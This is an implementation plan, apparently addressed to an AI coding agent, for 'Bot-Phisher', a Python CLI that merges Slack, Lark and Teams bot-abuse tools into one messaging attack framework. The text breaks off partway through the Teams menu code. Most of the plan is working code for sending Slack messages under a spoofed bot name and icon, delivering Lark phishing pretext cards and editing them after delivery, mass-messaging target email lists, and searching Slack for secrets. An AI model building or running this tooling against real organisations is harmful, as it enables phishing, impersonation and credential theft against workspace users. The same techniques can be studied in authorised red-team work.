# Bot-Phisher Unified CLI — Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Combine EvilSlackbot, LarkBotAbuser2, and teams-bot-validator into a single interactive CLI framework with Rich TUI menus, unified config, and structured logging.

**Architecture:** Package-per-platform (`bot_phisher/slack/`, `bot_phisher/lark/`, `bot_phisher/teams/`) with shared core utilities in `bot_phisher/core/`. Entry point via `python -m bot_phisher`. All platform modules follow the same pattern: `auth.py` for authentication, `actions.py` for operations.

**Tech Stack:** Python 3.12, pip, requests, slackclient, rich, questionary, pyyaml

---

### Task 1: Project Scaffolding

**Files:**
- Create: `bot_phisher/__init__.py`
- Create: `bot_phisher/__main__.py`
- Create: `bot_phisher/core/__init__.py`
- Create: `bot_phisher/slack/__init__.py`
- Create: `bot_phisher/lark/__init__.py`
- Create: `bot_phisher/teams/__init__.py`
- Create: `requirements.txt`
- Create: `config.yaml.example`
- Create: `.gitignore`

**Step 1: Create directory structure**

```bash
mkdir -p bot_phisher/core bot_phisher/slack bot_phisher/lark bot_phisher/teams
```

**Step 2: Create requirements.txt**

```
requests==2.32.3
slackclient==2.9.4
rich==13.9.4
questionary==2.1.0
pyyaml==6.0.2
```

**Step 3: Create all `__init__.py` files**

Empty files for `bot_phisher/__init__.py`, `bot_phisher/core/__init__.py`, `bot_phisher/slack/__init__.py`, `bot_phisher/lark/__init__.py`, `bot_phisher/teams/__init__.py`.

**Step 4: Create `bot_phisher/__main__.py`** (minimal placeholder)

```python
"""Bot-Phisher: Unified messaging platform attack framework."""

from bot_phisher.core.cli import main

if __name__ == "__main__":
    main()
```

**Step 5: Create `config.yaml.example`**

```yaml
slack:
  - name: "Example Slack Bot"
    token: "xoxb-your-token-here"

lark:
  - name: "Example Lark Bot"
    app_id: "cli_your_app_id"
    app_secret: "your_app_secret"

teams:
  - name: "Example Teams Bot"
    client_id: "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
    client_secret: "your-client-secret"
```

**Step 6: Create `.gitignore`**

```
config.yaml
targets.txt
logs/
__pycache__/
*.pyc
.DS_Store
```

**Step 7: Install dependencies**

Run: `pip install -r requirements.txt`

**Step 8: Copy pretexts to repo root**

```bash
cp -r LarkBotAbuser2/pretexts/ pretexts/
```

**Step 9: Commit**

```bash
git init
git add bot_phisher/ requirements.txt config.yaml.example .gitignore pretexts/
git commit -m "feat: scaffold bot-phisher project structure"
```

---

### Task 2: Core — Config Loader

**Files:**
- Create: `bot_phisher/core/config.py`

**Step 1: Implement config.py**

```python
"""Load and validate platform credentials from config.yaml."""

import sys
from pathlib import Path

import yaml


REQUIRED_FIELDS = {
    "slack": ["name", "token"],
    "lark": ["name", "app_id", "app_secret"],
    "teams": ["name", "client_id", "client_secret"],
}


def load_config(config_path="config.yaml"):
    """Load config.yaml, validate required fields, return dict."""
    path = Path(config_path)
    if not path.exists():
        print(
            f"[!] Config file '{config_path}' not found. "
            f"Copy config.yaml.example to config.yaml and fill in credentials."
        )
        sys.exit(1)

    with open(path) as f:
        config = yaml.safe_load(f)

    if not config:
        print(f"[!] Config file '{config_path}' is empty.")
        sys.exit(1)

    return config


def get_platform_entries(config, platform):
    """Get list of credential entries for a platform. Returns [] if none."""
    entries = config.get(platform, [])
    if not entries:
        return []

    for i, entry in enumerate(entries):
        required = REQUIRED_FIELDS.get(platform, [])
        for field in required:
            if field not in entry:
                print(
                    f"[!] {platform}[{i}] missing required field: '{field}'"
                )
                sys.exit(1)

    return entries
```

**Step 2: Verify it loads**

Run: `python -c "from bot_phisher.core.config import load_config; print('OK')"`
Expected: `OK`

**Step 3: Commit**

```bash
git add bot_phisher/core/config.py
git commit -m "feat: add YAML config loader with validation"
```

---

### Task 3: Core — Targets Loader

**Files:**
- Create: `bot_phisher/core/targets.py`

**Step 1: Implement targets.py**

```python
"""Load target email addresses from targets.txt."""

import sys
from pathlib import Path


def load_targets(targets_path="targets.txt"):
    """Load emails from file, one per line. Returns list of strings."""
    path = Path(targets_path)
    if not path.exists():
        print(f"[!] Targets file '{targets_path}' not found.")
        sys.exit(1)

    with open(path) as f:
        emails = [line.strip() for line in f if line.strip()]

    if not emails:
        print(f"[!] Targets file '{targets_path}' is empty.")
        sys.exit(1)

    return emails
```

**Step 2: Verify it loads**

Run: `python -c "from bot_phisher.core.targets import load_targets; print('OK')"`
Expected: `OK`

**Step 3: Commit**

```bash
git add bot_phisher/core/targets.py
git commit -m "feat: add targets file loader"
```

---

### Task 4: Core — Logger

**Files:**
- Create: `bot_phisher/core/logger.py`

**Step 1: Implement logger.py**

```python
"""Dual-output logger: Rich console + JSON log file."""

import json
from datetime import datetime, timezone
from pathlib import Path

from rich.console import Console

console = Console()

_log_entries = []
_log_file = None


def init_log():
    """Initialize a new log file for this session."""
    global _log_file
    logs_dir = Path("logs")
    logs_dir.mkdir(exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S")
    _log_file = logs_dir / f"bot_phisher_{timestamp}.json"


def log_result(platform, action, bot_name, target, status, detail=""):
    """Log a send result to both console and file."""
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "platform": platform,
        "action": action,
        "bot_name": bot_name,
        "target": target,
        "status": status,
        "detail": detail,
    }
    _log_entries.append(entry)

    style = "green" if status == "success" else "red"
    console.print(
        f"  [{style}]{status.upper()}[/{style}] {target}: {detail}"
    )

    if _log_file:
        with open(_log_file, "w") as f:
            json.dump(_log_entries, f, indent=2)


def log_info(message):
    """Print an informational message to console only."""
    console.print(message)
```

**Step 2: Verify it loads**

Run: `python -c "from bot_phisher.core.logger import log_info; log_info('test'); print('OK')"`
Expected: prints `test` then `OK`

**Step 3: Commit**

```bash
git add bot_phisher/core/logger.py
git commit -m "feat: add dual-output logger (console + JSON file)"
```

---

### Task 5: Core — CLI Menus and Main Loop

**Files:**
- Create: `bot_phisher/core/cli.py`

**Step 1: Implement cli.py**

```python
"""Interactive CLI menus using Rich and questionary."""

import sys

import questionary
from rich.console import Console
from rich.panel import Panel

from bot_phisher.core.config import get_platform_entries, load_config
from bot_phisher.core.logger import init_log, log_info


console = Console()

BANNER = r"""
 ____        _     ____  _     _     _
| __ )  ___ | |_  |  _ \| |__ (_)___| |__   ___ _ __
|  _ \ / _ \| __| | |_) | '_ \| / __| '_ \ / _ \ '__|
| |_) | (_) | |_  |  __/| | | | \__ \ | | |  __/ |
|____/ \___/ \__| |_|   |_| |_|_|___/_| |_|\___|_|
"""


def show_banner():
    """Display the bot-phisher banner."""
    console.print(BANNER, style="bold cyan")


def pick_platform():
    """Prompt user to select a messaging platform."""
    return questionary.select(
        "Select a platform:",
        choices=["Slack", "Lark", "Teams", "Exit"],
    ).ask()


def pick_entry(entries):
    """Prompt user to select a bot/credential entry by name."""
    if len(entries) == 1:
        log_info(f"[cyan]Using:[/cyan] {entries[0]['name']}")
        return entries[0]

    names = [e["name"] for e in entries]
    choice = questionary.select(
        "Select bot/credentials:", choices=names
    ).ask()
    if not choice:
        return None
    return next(e for e in entries if e["name"] == choice)


def pick_targets_source():
    """Prompt user to load targets from file or enter single email."""
    return questionary.select(
        "How to specify targets?",
        choices=[
            "Load from targets.txt",
            "Enter single email",
        ],
    ).ask()


def confirm_send(platform, action, bot_name, targets, message_preview):
    """Show summary and confirm before sending."""
    console.print()
    console.print(
        Panel(
            f"[bold]Platform:[/bold] {platform}\n"
            f"[bold]Action:[/bold] {action}\n"
            f"[bold]Bot:[/bold] {bot_name}\n"
            f"[bold]Targets:[/bold] {len(targets)} recipient(s)\n"
            f"[bold]Preview:[/bold] {message_preview[:200]}",
            title="Send Confirmation",
            border_style="yellow",
        )
    )
    return questionary.confirm("Send messages?", default=False).ask()


def main():
    """Main entry point — platform selection loop."""
    show_banner()
    init_log()
    config = load_config()

    while True:
        platform = pick_platform()
        if not platform or platform == "Exit":
            log_info("[yellow]Exiting bot-phisher.[/yellow]")
            sys.exit(0)

        platform_key = platform.lower()
        entries = get_platform_entries(config, platform_key)
        if not entries:
            log_info(
                f"[red]No {platform} credentials in config.yaml.[/red]"
            )
            continue

        entry = pick_entry(entries)
        if not entry:
            continue

        if platform_key == "slack":
            from bot_phisher.slack import run_slack_menu
            run_slack_menu(entry)
        elif platform_key == "lark":
            from bot_phisher.lark import run_lark_menu
            run_lark_menu(entry)
        elif platform_key == "teams":
            from bot_phisher.teams import run_teams_menu
            run_teams_menu(entry)
```

**Step 2: Verify CLI loads (will fail on missing platform menus, but import should work)**

Run: `python -c "from bot_phisher.core.cli import show_banner; show_banner()"`
Expected: prints the banner

**Step 3: Commit**

```bash
git add bot_phisher/core/cli.py bot_phisher/__main__.py
git commit -m "feat: add interactive CLI menus and main loop"
```

---

### Task 6: Slack — Auth

**Files:**
- Create: `bot_phisher/slack/auth.py`

**Step 1: Implement slack/auth.py**

Migrated from `EvilSlackbot/EvilSlackbot.py` — `checkperms()` and `token_attacks()` logic, refactored to use function parameters instead of globals.

```python
"""Slack token validation and permission checking."""

from slack import WebClient
from slack.errors import SlackApiError

from bot_phisher.core.logger import log_info


def create_client(token):
    """Create an authenticated Slack WebClient."""
    return WebClient(token)


def check_permissions(client):
    """Validate token and return (bot_name, permissions_list)."""
    try:
        check = client.api_call("auth.test")
    except SlackApiError as e:
        log_info(f"[red]Slack auth failed: {e.response['error']}[/red]")
        return None, []

    perms = check.headers.get("x-oauth-scopes", "").split(",")
    bot_name = check.get("user", "unknown")

    log_info(f"[green]Authenticated as:[/green] {bot_name}")
    log_info(f"[cyan]Permissions:[/cyan] {', '.join(perms)}")

    return bot_name, perms


def get_available_actions(perms):
    """Return list of action names available for the given permissions."""
    actions = []
    if "chat:write.customize" in perms:
        actions.append("Send spoofed message")
    if "chat:write" in perms:
        actions.append("Send message (as bot)")
    if "files:write" in perms:
        actions.append("Send file attachment")
    if "search:read" in perms:
        actions.append("Search for secrets")
    if "channels:read" in perms:
        actions.append("List channels")
    actions.append("Check token permissions")
    actions.append("Back to main menu")
    return actions
```

**Step 2: Verify import**

Run: `python -c "from bot_phisher.slack.auth import get_available_actions; print(get_available_actions(['chat:write']))"`
Expected: `['Send message (as bot)', 'Check token permissions', 'Back to main menu']`

**Step 3: Commit**

```bash
git add bot_phisher/slack/auth.py
git commit -m "feat: add Slack token auth and permission checking"
```

---

### Task 7: Slack — Actions

**Files:**
- Create: `bot_phisher/slack/actions.py`
- Modify: `bot_phisher/slack/__init__.py`

**Step 1: Implement slack/actions.py**

Migrated from `EvilSlackbot/EvilSlackbot.py` — all send/search/list functions, refactored to accept client and parameters explicitly.

```python
"""Slack attack actions: send, spoof, attach, search, list channels."""

from slack.errors import SlackApiError

from bot_phisher.core.logger import log_info, log_result


def lookup_user_by_email(client, email):
    """Resolve email to Slack user ID. Returns user_id or None."""
    try:
        result = client.api_call(f"users.lookupByEmail?email={email}")
        return result["user"]["id"]
    except SlackApiError:
        return None


def lookup_channel(client, channel_name):
    """Resolve channel name to channel ID. Returns channel_id or None."""
    try:
        result = client.conversations_list(
            types="public_channel,private_channel"
        )
        for chan in result["channels"]:
            if chan["name"] == channel_name:
                return chan["id"]
    except SlackApiError as e:
        log_info(f"[red]Channel lookup error: {e.response['error']}[/red]")
    return None


def send_spoofed_message(
    client, target_id, bot_name_label, message, icon_url=""
):
    """Send a spoofed message with custom name and icon."""
    try:
        client.chat_postMessage(
            channel=target_id,
            username=bot_name_label,
            icon_url=icon_url,
            text=message,
        )
        return True, f"Delivered to {target_id}"
    except SlackApiError as e:
        return False, e.response["error"]


def send_message(client, target_id, message):
    """Send a message as the bot identity."""
    try:
        client.chat_postMessage(channel=target_id, text=message)
        return True, f"Delivered to {target_id}"
    except SlackApiError as e:
        return False, e.response["error"]


def send_file(client, target_id, file_path, message, file_title):
    """Send a file attachment with a message."""
    try:
        client.files_upload(
            channels=target_id,
            file=file_path,
            title=file_title,
            initial_comment=message,
        )
        return True, f"File sent to {target_id}"
    except SlackApiError as e:
        return False, e.response["error"]


def search_messages(client, keyword, outfile=None):
    """Search Slack messages by keyword. Returns list of match texts."""
    try:
        result = client.search_messages(query=keyword, sort="timestamp")
        matches = result.data["messages"]["matches"]
        texts = [m["text"] for m in matches]

        if not texts:
            log_info("[yellow]No results found.[/yellow]")
            return []

        for text in texts:
            log_info(text)

        if outfile:
            with open(outfile, "w") as f:
                f.write("\n".join(texts))
            log_info(f"[cyan]Results saved to {outfile}[/cyan]")

        return texts
    except SlackApiError as e:
        log_info(f"[red]Search error: {e.response['error']}[/red]")
        return []


def list_channels(client, outfile=None):
    """List all public/private channels. Returns list of names."""
    channels = []
    cursor = None
    try:
        while True:
            kwargs = {
                "types": "public_channel,private_channel",
                "limit": 999,
            }
            if cursor:
                kwargs["cursor"] = cursor
            result = client.conversations_list(**kwargs)
            channels.extend(
                [c["name"] for c in result["channels"]]
            )
            cursor = result.get(
                "response_metadata", {}
            ).get("next_cursor")
            if not cursor:
                break
    except SlackApiError as e:
        log_info(f"[red]Channel list error: {e.response['error']}[/red]")

    for name in channels:
        log_info(f"  {name}")

    if outfile and channels:
        with open(outfile, "w") as f:
            f.write("\n".join(channels))
        log_info(f"[cyan]Channel list saved to {outfile}[/cyan]")

    return channels
```

**Step 2: Implement slack/__init__.py with the platform menu**

```python
"""Slack platform menu and action dispatcher."""

import questionary

from bot_phisher.core.cli import confirm_send, pick_targets_source
from bot_phisher.core.logger import log_info, log_result
from bot_phisher.core.targets import load_targets
from bot_phisher.slack.actions import (
    list_channels,
    lookup_user_by_email,
    search_messages,
    send_file,
    send_message,
    send_spoofed_message,
)
from bot_phisher.slack.auth import (
    check_permissions,
    create_client,
    get_available_actions,
)


def _get_targets(client):
    """Resolve target emails to Slack user IDs."""
    source = pick_targets_source()
    if source == "Enter single email":
        email = questionary.text("Enter target email:").ask()
        if not email:
            return []
        return [(email, lookup_user_by_email(client, email))]

    emails = load_targets()
    targets = []
    for email in emails:
        uid = lookup_user_by_email(client, email)
        if uid:
            targets.append((email, uid))
        else:
            log_info(f"[red]  User not found: {email}[/red]")
    return targets


def run_slack_menu(entry):
    """Run the Slack interactive action menu."""
    client = create_client(entry["token"])
    bot_name, perms = check_permissions(client)
    if not perms:
        return

    while True:
        actions = get_available_actions(perms)
        action = questionary.select(
            "Select Slack action:", choices=actions
        ).ask()
        if not action or action == "Back to main menu":
            return

        if action == "Check token permissions":
            check_permissions(client)

        elif action == "List channels":
            outfile = questionary.text(
                "Save to file (leave empty for terminal only):"
            ).ask()
            list_channels(client, outfile or None)

        elif action == "Search for secrets":
            keyword = questionary.text("Enter search keyword:").ask()
            if not keyword:
                continue
            outfile = questionary.text(
                "Save to file (leave empty for terminal only):"
            ).ask()
            search_messages(client, keyword, outfile or None)

        elif action == "Send spoofed message":
            spoof_name = questionary.text(
                "Bot name to impersonate:"
            ).ask()
            icon_url = questionary.text(
                "Icon URL (leave empty for none):"
            ).ask()
            message = questionary.text("Message text:").ask()
            if not message:
                continue
            targets = _get_targets(client)
            if not targets:
                continue
            emails = [t[0] for t in targets]
            if not confirm_send(
                "Slack", "spoofed", spoof_name, emails, message
            ):
                continue
            for email, uid in targets:
                if not uid:
                    log_result(
                        "slack", "send_spoofed", spoof_name,
                        email, "failure", "User not found",
                    )
                    continue
                ok, detail = send_spoofed_message(
                    client, uid, spoof_name, message, icon_url
                )
                log_result(
                    "slack", "send_spoofed", spoof_name, email,
                    "success" if ok else "failure", detail,
                )

        elif action == "Send message (as bot)":
            message = questionary.text("Message text:").ask()
            if not message:
                continue
            targets = _get_targets(client)
            if not targets:
                continue
            emails = [t[0] for t in targets]
            if not confirm_send(
                "Slack", "message", bot_name, emails, message
            ):
                continue
            for email, uid in targets:
                if not uid:
                    log_result(
                        "slack", "send_message", bot_name,
                        email, "failure", "User not found",
                    )
                    continue
                ok, detail = send_message(client, uid, message)
                log_result(
                    "slack", "send_message", bot_name, email,
                    "success" if ok else "failure", detail,
                )

        elif action == "Send file attachment":
            file_path = questionary.path(
                "Path to file:"
            ).ask()
            if not file_path:
                continue
            file_title = questionary.text("File title:").ask()
            message = questionary.text(
                "Accompanying message:"
            ).ask()
            targets = _get_targets(client)
            if not targets:
                continue
            emails = [t[0] for t in targets]
            if not confirm_send(
                "Slack", "attachment", bot_name, emails,
                f"File: {file_path}",
            ):
                continue
            for email, uid in targets:
                if not uid:
                    log_result(
                        "slack", "send_file", bot_name,
                        email, "failure", "User not found",
                    )
                    continue
                ok, detail = send_file(
                    client, uid, file_path, message, file_title
                )
                log_result(
                    "slack", "send_file", bot_name, email,
                    "success" if ok else "failure", detail,
                )
```

**Step 3: Commit**

```bash
git add bot_phisher/slack/
git commit -m "feat: add Slack actions and platform menu"
```

---

### Task 8: Lark — Auth

**Files:**
- Create: `bot_phisher/lark/auth.py`

**Step 1: Implement lark/auth.py**

Migrated from `LarkBotAbuser2/lba.py` — `get_tenant_access_token()`.

```python
"""Lark/Feishu tenant access token acquisition."""

import json

import requests

from bot_phisher.core.logger import log_info


BASE_URL = "https://open.feishu.cn/open-apis/"


def get_tenant_token(app_id, app_secret):
    """Acquire a tenant access token. Returns token string or None."""
    url = BASE_URL + "auth/v3/tenant_access_token/internal"
    headers = {"Content-Type": "application/json"}
    body = {"app_id": app_id, "app_secret": app_secret}

    try:
        resp = requests.post(
            url, data=json.dumps(body).encode(), headers=headers
        )
        if resp.status_code == 200:
            token = resp.json().get("tenant_access_token", "")
            if token:
                log_info(
                    f"[green]Lark tenant token acquired[/green] "
                    f"({token[:20]}...)"
                )
                return token
            msg = resp.json().get("msg", "unknown error")
            log_info(f"[red]Lark token error: {msg}[/red]")
        else:
            log_info(
                f"[red]Lark token HTTP {resp.status_code}[/red]"
            )
    except requests.RequestException as e:
        log_info(f"[red]Lark connection error: {e}[/red]")

    return None
```

**Step 2: Verify import**

Run: `python -c "from bot_phisher.lark.auth import BASE_URL; print(BASE_URL)"`
Expected: `https://open.feishu.cn/open-apis/`

**Step 3: Commit**

```bash
git add bot_phisher/lark/auth.py
git commit -m "feat: add Lark tenant token authentication"
```

---

### Task 9: Lark — Actions

**Files:**
- Create: `bot_phisher/lark/actions.py`
- Modify: `bot_phisher/lark/__init__.py`

**Step 1: Implement lark/actions.py**

Migrated from `LarkBotAbuser2/lba.py` — `get_chat_id()`, `send_lark_message()`, `patch_lark_message()`, `create_card_data()`.

```python
"""Lark/Feishu actions: send card, edit card, resolve chat ID."""

import json
import os

import requests

from bot_phisher.core.logger import log_info
from bot_phisher.lark.auth import BASE_URL


PRETEXTS_DIR = "pretexts/"


def list_cards():
    """List available pretext card JSON files. Returns list of filenames."""
    if not os.path.isdir(PRETEXTS_DIR):
        log_info(f"[red]Pretexts directory '{PRETEXTS_DIR}' not found[/red]")
        return []
    return [
        f for f in os.listdir(PRETEXTS_DIR)
        if os.path.isfile(os.path.join(PRETEXTS_DIR, f))
        and f.endswith(".json")
    ]


def load_card(filename):
    """Load a pretext card JSON file. Returns JSON string."""
    with open(os.path.join(PRETEXTS_DIR, filename)) as f:
        return json.dumps(json.load(f))


def get_chat_id(token, email):
    """Resolve email to Lark chat_id. Returns chat_id or None."""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json; charset=utf-8",
    }
    try:
        resp = requests.post(
            BASE_URL + "user/v4/email2id",
            headers=headers,
            json={"email": email},
        )
        resp.raise_for_status()
        open_id = resp.json().get("data", {}).get("open_id")
        if not open_id:
            log_info(f"[red]Open ID not found for {email}[/red]")
            return None

        resp = requests.get(
            BASE_URL + "chat/v4/p2p/id",
            params={"open_id": open_id},
            headers=headers,
        )
        chat_id = resp.json().get("data", {}).get("chat_id")
        if not chat_id:
            log_info(f"[red]Chat ID not found for {email}[/red]")
        return chat_id

    except requests.RequestException as e:
        log_info(f"[red]Lark ID lookup error for {email}: {e}[/red]")
        return None


def send_card(token, chat_id, card_data):
    """Send an interactive card message. Returns (ok, detail)."""
    url = BASE_URL + "im/v1/messages"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    body = {
        "receive_id": chat_id,
        "msg_type": "interactive",
        "content": card_data,
    }
    try:
        resp = requests.post(
            url,
            params={"receive_id_type": "chat_id"},
            headers=headers,
            data=json.dumps(body),
        )
        resp.raise_for_status()
        message_id = resp.json().get("data", {}).get("message_id", "")
        return True, f"Sent (message_id: {message_id})"
    except requests.RequestException as e:
        return False, str(e)


def edit_card(token, message_id, card_data):
    """Edit a previously sent card message. Returns (ok, detail)."""
    url = BASE_URL + f"im/v1/messages/{message_id}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    body = {"content": card_data}
    try:
        resp = requests.patch(
            url, headers=headers, data=json.dumps(body)
        )
        resp.raise_for_status()
        return True, f"Edited message_id: {message_id}"
    except requests.RequestException as e:
        return False, str(e)
```

**Step 2: Implement lark/__init__.py with the platform menu**

```python
"""Lark platform menu and action dispatcher."""

import questionary

from bot_phisher.core.cli import confirm_send, pick_targets_source
from bot_phisher.core.logger import log_info, log_result
from bot_phisher.core.targets import load_targets
from bot_phisher.lark.actions import (
    edit_card,
    get_chat_id,
    list_cards,
    load_card,
    send_card,
)
from bot_phisher.lark.auth import get_tenant_token


def run_lark_menu(entry):
    """Run the Lark interactive action menu."""
    token = get_tenant_token(entry["app_id"], entry["app_secret"])
    if not token:
        return

    while True:
        action = questionary.select(
            "Select Lark action:",
            choices=[
                "Send card message",
                "Edit previous message",
                "Back to main menu",
            ],
        ).ask()
        if not action or action == "Back to main menu":
            return

        cards = list_cards()
        if not cards:
            log_info("[red]No pretext cards found in pretexts/[/red]")
            continue

        card_choice = questionary.select(
            "Select pretext card:", choices=cards
        ).ask()
        if not card_choice:
            continue
        card_data = load_card(card_choice)

        if action == "Edit previous message":
            msg_id = questionary.text(
                "Message ID to edit (starts with om_):"
            ).ask()
            if not msg_id:
                continue
            ok, detail = edit_card(token, msg_id, card_data)
            log_result(
                "lark", "edit_card", entry["name"], msg_id,
                "success" if ok else "failure", detail,
            )
            continue

        # Send card message
        source = pick_targets_source()
        if source == "Enter single email":
            email = questionary.text("Enter target email:").ask()
            if not email:
                continue
            emails = [email]
        else:
            emails = load_targets()

        if not confirm_send(
            "Lark", "send_card", entry["name"], emails, card_choice
        ):
            continue

        for email in emails:
            chat_id = get_chat_id(token, email)
            if not chat_id:
                log_result(
                    "lark", "send_card", entry["name"],
                    email, "failure", "Chat ID not resolved",
                )
                continue
            ok, detail = send_card(token, chat_id, card_data)
            log_result(
                "lark", "send_card", entry["name"], email,
                "success" if ok else "failure", detail,
            )
```

**Step 3: Commit**

```bash
git add bot_phisher/lark/
git commit -m "feat: add Lark card send/edit actions and platform menu"
```

---

### Task 10: Teams — Auth

**Files:**
- Create: `bot_phisher/teams/auth.py`

**Step 1: Implement teams/auth.py**

Migrated from `teams-bot-validator.py` — `get_token()`, `decode_jwt_payload()`, plus new Graph token acquisition.

```python
"""Teams OAuth2 auth, JWT decode, and Graph token acquisition."""

import base64
import json

import requests

from bot_phisher.core.logger import log_info


TOKEN_URL = (
    "https://login.microsoftonline.com/"
    "botframework.com/oauth2/v2.0/token"
)

BOT_SCOPE = "https://api.botframework.com/.default"
GRAPH_SCOPE = "https://graph.microsoft.com/.default"


def _request_token(client_id, client_secret, scope):
    """Request an OAuth2 token. Returns response or None."""
    payload = {
        "grant_type": "client_credentials",
        "client_id": client_id,
        "client_secret": client_secret,
        "scope": scope,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        return requests.post(TOKEN_URL, data=payload, headers=headers)
    except requests.RequestException as e:
        log_info(f"[red]Connection error: {e}[/red]")
        return None


def get_bot_token(client_id, client_secret):
    """Get Bot Framework access token. Returns token string or None."""
    resp = _request_token(client_id, client_secret, BOT_SCOPE)
    if not resp:
        return None
    if resp.status_code == 200:
        token = resp.json().get("access_token")
        log_info("[green]Bot Framework credentials valid[/green]")
        return token
    log_info(
        f"[red]Bot auth failed ({resp.status_code}): "
        f"{resp.text}[/red]"
    )
    return None


def get_graph_token(client_id, client_secret):
    """Get Graph API access token. Returns token string or None."""
    resp = _request_token(client_id, client_secret, GRAPH_SCOPE)
    if not resp:
        return None
    if resp.status_code == 200:
        token = resp.json().get("access_token")
        log_info("[green]Graph API token acquired[/green]")
        return token
    log_info(
        f"[red]Graph auth failed ({resp.status_code}): "
        f"{resp.text}[/red]"
    )
    return None


def decode_jwt_payload(token):
    """Decode JWT payload for inspection. Returns dict or None."""
    try:
        _, payload_b64, _ = token.split(".")
        padding = len(payload_b64) % 4
        if padding:
            payload_b64 += "=" * (4 - padding)
        decoded = base64.b64decode(payload_b64).decode("utf-8")
        return json.loads(decoded)
    except Exception:
        return None


def enumerate_graph_permissions(token):
    """Decode Graph token and list application permissions."""
    claims = decode_jwt_payload(token)
    if not claims:
        log_info("[red]Failed to decode Graph token[/red]")
        return []
    roles = claims.get("roles", [])
    if roles:
        log_info("[cyan]Application permissions (roles):[/cyan]")
        for role in roles:
            log_info(f"  - {role}")
    else:
        log_info("[yellow]No application roles found in token[/yellow]")
    return roles
```

**Step 2: Verify import**

Run: `python -c "from bot_phisher.teams.auth import TOKEN_URL; print(TOKEN_URL)"`
Expected: the Microsoft token URL

**Step 3: Commit**

```bash
git add bot_phisher/teams/auth.py
git commit -m "feat: add Teams OAuth2 auth and Graph permission enumeration"
```

---

### Task 11: Teams — Actions (Including New Message Sending)

**Files:**
- Create: `bot_phisher/teams/actions.py`
- Modify: `bot_phisher/teams/__init__.py`

**Step 1: Implement teams/actions.py**

New functionality: resolve email via Graph API, create 1:1 conversation via Bot Framework Connector, send message.

```python
"""Teams actions: validate, enumerate, send messages."""

import requests

from bot_phisher.core.logger import log_info


SERVICE_URL = "https://smba.trafficmanager.net/teams/"


def resolve_user_id(graph_token, email):
    """Resolve email to Azure AD user ID via Graph API.

    Returns user ID string or None.
    """
    url = f"https://graph.microsoft.com/v1.0/users/{email}"
    headers = {"Authorization": f"Bearer {graph_token}"}
    try:
        resp = requests.get(url, headers=headers)
        if resp.status_code == 200:
            return resp.json().get("id")
        log_info(
            f"[red]Graph user lookup failed for {email}: "
            f"{resp.status_code}[/red]"
        )
    except requests.RequestException as e:
        log_info(f"[red]Graph API error: {e}[/red]")
    return None


def create_conversation(bot_token, bot_app_id, user_id, tenant_id):
    """Create a 1:1 conversation with a Teams user.

    Returns conversation_id or None.
    """
    url = f"{SERVICE_URL}v3/conversations"
    headers = {
        "Authorization": f"Bearer {bot_token}",
        "Content-Type": "application/json",
    }
    body = {
        "bot": {"id": bot_app_id},
        "members": [{"id": f"29:{user_id}"}],
        "channelData": {"tenant": {"id": tenant_id}},
        "isGroup": False,
    }
    try:
        resp = requests.post(url, headers=headers, json=body)
        if resp.status_code in (200, 201):
            return resp.json().get("id")
        log_info(
            f"[red]Create conversation failed ({resp.status_code}): "
            f"{resp.text}[/red]"
        )
    except requests.RequestException as e:
        log_info(f"[red]Bot Framework error: {e}[/red]")
    return None


def send_activity(bot_token, conversation_id, message):
    """Send a message activity to a conversation. Returns (ok, detail)."""
    url = (
        f"{SERVICE_URL}v3/conversations/"
        f"{conversation_id}/activities"
    )
    headers = {
        "Authorization": f"Bearer {bot_token}",
        "Content-Type": "application/json",
    }
    body = {"type": "message", "text": message}
    try:
        resp = requests.post(url, headers=headers, json=body)
        if resp.status_code in (200, 201):
            activity_id = resp.json().get("id", "")
            return True, f"Delivered (activity: {activity_id})"
        return False, f"HTTP {resp.status_code}: {resp.text}"
    except requests.RequestException as e:
        return False, str(e)


def send_message_to_user(
    bot_token, graph_token, bot_app_id, tenant_id, email, message
):
    """Full flow: resolve user, create conversation, send message.

    Returns (ok, detail).
    """
    user_id = resolve_user_id(graph_token, email)
    if not user_id:
        return False, f"Could not resolve user: {email}"

    conv_id = create_conversation(
        bot_token, bot_app_id, user_id, tenant_id
    )
    if not conv_id:
        return False, f"Could not create conversation with {email}"

    return send_activity(bot_token, conv_id, message)
```

**Step 2: Implement teams/__init__.py with the platform menu**

```python
"""Teams platform menu and action dispatcher."""

import questionary

from bot_phisher.core.cli import confirm_send, pick_targets_source
from bot_phisher.core.logger import log_info, log_result
from bot_phisher.core.targets import load_targets
from bot_phisher.teams.actions import send_message_to_user
from bot_phisher.teams.auth import (
    decode_jwt_payload,
    enumerate_graph_permissions,
    get_bot_token,
    get_graph_token,
)


def run_teams_menu(entry):
    """Run the Teams interactive action menu."""
    client_id = entry["client_id"]
    client_secret = entry["client_secret"]

    bot_token = get_bot_token(client_id, client_secret)

    while True:
        action = questionary.select(
            "Select Teams action:",
            choices=[
                "Validate credentials",
                "Enumerate Graph API permissions",
                "Send message to user",
                "Back to main menu",
            ],
        ).ask()
        if not action or action == "Back to main menu":
            return

        if action == "Validate credentials":
            if bot_token:
                log_info("[green]Bot Framework: VALID[/green]")
            else:
                bot_token = get_bot_token(client_id, client_secret)

            graph_token = get_graph_token(client_id, client_secret)
            if graph_token:
                log_info("[green]Graph API: VALID[/green]")

        elif action == "Enumerate Graph API permissions":
            graph_token = get_graph_token(client_id, client_secret)
            if graph_token:
                enumerate_graph_permissions(graph_token)

        elif action == "Send message to user":
            if not bot_token:
                log_info(
                    "[red]Bot token required. "
                    "Run 'Validate credentials' first.[/red]"
                )
                continue

            graph_token = get_graph_token(client_id, client_secret)
            if not graph_token:
                log_info(
                    "[red]Graph token required for user resolution. "
                    "Ensure app has User.Read.All permission.[/red]"
                )
                continue

            # Get tenant ID from bot token
            claims = decode_jwt_payload(bot_token)
            tenant_id = ""
            if claims:
                tenant_id = claims.get(
                    "tid", claims.get("appid", "")
                )

            if not tenant_id:
                tenant_id = questionary.text(
                    "Enter Azure tenant ID:"
                ).ask()
                if not tenant_id:
                    continue

